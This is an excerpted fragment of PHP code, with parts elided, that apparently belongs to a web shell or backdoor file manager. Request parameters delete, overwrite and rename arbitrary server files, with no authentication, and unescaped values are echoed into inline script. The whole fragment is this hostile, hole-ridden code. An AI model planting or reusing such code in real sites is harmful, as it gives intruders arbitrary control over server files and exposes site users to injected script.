...
if (isset($_GET['delete'])) {
	if (unlink($_GET['delete'])) {
		echo "<script>alert('Deleted!');window.location='?dir=".$dir."';</script>";
	}
}
if (isset($_GET['ubah'])) {
	echo '
...
if (isset($_POST['edit'])) {
	...
	if (fwrite($data, $_POST['edit'])) {
		...
		echo 
			'
			<script>alert("Good edit file!");window.location="?dir='.$dir.'";</script>						
			';

	} else {
		echo "
			<script>alert('Edit error!');</script>					
			";
	}
}
...
if($_GET['rename']){
	if(isset($_POST['newname'])){
		if(rename($_GET['rename'], $_GET['dir'] . '/' .$_POST['newname'])){
			echo '<font color="green">Good rename!</font><br/>';
